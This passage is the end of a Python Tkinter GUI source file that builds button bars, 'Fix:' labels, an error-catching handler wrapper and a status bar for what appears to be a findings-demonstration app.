                widget.see("end")
                widget.update_idletasks()
            return log
        log = make_log(out)

        for label, handler in f["buttons"]:
            is_live = "LIVE" in label
            b = tk.Button(btnbar, text=label,
                          fg="white" if is_live else "black",
                          bg="#c0392b" if is_live else "#e6e9ee",
                          font=("Segoe UI", 9, "bold" if is_live else "normal"),
                          command=lambda h=handler, lg=log: self._safe(h, lg))
            b.pack(side="left", padx=4, pady=4)
        tk.Button(btnbar, text="Clear", command=lambda w=out: w.delete("1.0", "end")).pack(side="right", padx=4)

        tk.Label(frame, text="Fix: " + f["fix"], wraplength=960, justify="left",
                 fg="#1e8449").pack(fill="x", padx=10, pady=(0, 8), anchor="w")

    def _safe(self, handler, log):
        try:
            handler(log, self)
        except Exception as e:  # noqa
            log(f"\n[error: {e}]\n")
            self.status.config(text=f"error: {e}")

    def _build_statusbar(self):
        self.status = tk.Label(self, text="ready", anchor="w", bg="#eef2f6")
        self.status.pack(fill="x", side="bottom")


if __name__ == "__main__":
    App().mainloop()
